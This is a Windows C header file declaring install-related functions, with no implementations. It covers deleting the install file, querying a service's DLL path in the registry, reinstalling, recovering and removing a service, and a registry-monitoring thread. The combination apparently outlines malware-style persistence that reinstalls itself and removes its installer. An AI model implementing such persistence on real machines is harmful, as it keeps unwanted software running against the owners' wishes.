
#if !defined(AFX_INSTALL_H_INCLUDED)
#define AFX_INSTALL_H_INCLUDED
#include <windows.h>
#include <Shlwapi.h>
void	DeleteInstallFile();
bool	IsServiceRegExists(char *lpServiceName);
bool	GetServiceDllPath(char *lpServiceName, LPTSTR lpBuffer, UINT uSize);
void	ReInstallService(char *lpServiceName);
DWORD	QueryServiceTypeFromRegedit(char *lpServiceName);
int		RecoverService(char *lpServiceName);
void	RemoveService(LPCTSTR lpServiceName);
DWORD WINAPI MonitorReg(LPVOID lparam);
#endif // !defined(AFX_INSTALL_H_INCLUDED)